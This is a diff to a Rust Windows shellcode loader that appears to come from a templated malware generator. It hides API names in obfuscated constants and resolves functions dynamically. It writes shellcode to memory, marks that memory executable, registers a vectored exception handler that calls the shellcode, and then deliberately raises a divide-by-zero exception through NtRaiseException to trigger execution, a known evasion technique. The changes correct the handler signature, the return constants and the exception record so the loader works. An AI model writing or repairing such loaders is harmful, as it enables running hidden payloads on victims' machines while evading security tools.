@@ -10,8 +10,9 @@ use std::ptr::null_mut;
 
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE},
+        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE, EXCEPTION_POINTERS, PEXCEPTION_POINTERS, EXCEPTION_RECORD, CONTEXT, PEXCEPTION_RECORD, PCONTEXT},
         libloaderapi::{GetModuleHandleA, GetProcAddress},
+        errhandlingapi::PVECTORED_EXCEPTION_HANDLER,
     },
     shared::{
         ntdef::{NT_SUCCESS, HANDLE},
@@ -36,18 +37,19 @@ const OBF_ADD_VECTORED_EXCEPTION_HANDLER: &[u8] = &{{OBF_ADD_VECTORED_EXCEPTION_
 // Global to hold shellcode address for the VEH handler
 static mut SHELLCODE_ADDR: *const u8 = null_mut();
 
-// Windows exception constant
-const EXCEPTION_CONTINUTE_EXECUTION: i32 = 0x00000001;
+// Windows exception constants
+const EXCEPTION_CONTINUE_EXECUTION: i32 = -1; // 0xFFFFFFFF
+const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
 
-// Use raw pointer for the exception handler
-extern "system" fn veh_handler(_exception_info: *mut c_void) -> i32 {
+// Vectored Exception Handler - must match PVECTORED_EXCEPTION_HANDLER signature
+extern "system" fn veh_handler(exception_info: PEXCEPTION_POINTERS) -> i32 {
     unsafe {
         if !SHELLCODE_ADDR.is_null() {
             let shellcode_fn: extern "system" fn() = std::mem::transmute(SHELLCODE_ADDR);
             shellcode_fn();
         }
     }
-    EXCEPTION_CONTINUTE_EXECUTION
+    EXCEPTION_CONTINUE_EXECUTION
 }
 
 fn r(d: &[u8]) -> Vec<u8> {
@@ -93,13 +95,13 @@ type FnNtProtectVirtualMemory = unsafe extern "system" fn(
     *mut u32,
 ) -> i32;
 type FnNtRaiseException = unsafe extern "system" fn(
-    *mut c_void,
-    *mut c_void,
+    PEXCEPTION_RECORD,
+    PCONTEXT,
     u32,
 ) -> i32;
 type FnAddVectoredExceptionHandler = unsafe extern "system" fn(
-    i32,
-    Option<extern "system" fn(*mut c_void) -> i32>,
+    u32,
+    PVECTORED_EXCEPTION_HANDLER,
 ) -> *mut c_void;
 
 fn allocate_rw_memory(size: usize) -> Option<*mut c_void> {
@@ -171,16 +173,24 @@ fn change_protection_to_rx(mut address: *mut c_void, size: usize) -> bool {
 unsafe fn register_veh_handler() -> bool {
     let f_add_veh: FnAddVectoredExceptionHandler = std::mem::transmute(kernel32_g(OBF_ADD_VECTORED_EXCEPTION_HANDLER));
     
-    let result = f_add_veh(1, Some(veh_handler));
+    let result = f_add_veh(1, veh_handler);
     !result.is_null()
 }
 
 unsafe fn raise_exception() {
     let f_raise: FnNtRaiseException = std::mem::transmute(g(OBF_NT_RAISE_EXCEPTION));
     
-    // EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094
+    // Create exception record for division by zero
+    let mut exception_record: EXCEPTION_RECORD = std::mem::zeroed();
+    exception_record.ExceptionCode = 0xC0000094; // EXCEPTION_INT_DIVIDE_BY_ZERO
+    exception_record.ExceptionFlags = 0;
+    exception_record.ExceptionRecord = null_mut();
+    exception_record.ExceptionAddress = null_mut();
+    exception_record.NumberParameters = 0;
+    
+    // NtRaiseException signature: PEXCEPTION_RECORD, PCONTEXT, BOOL
     let _ = f_raise(
-        0xC0000094 as *mut c_void,
+        &mut exception_record,
         null_mut(),
         0,
     );
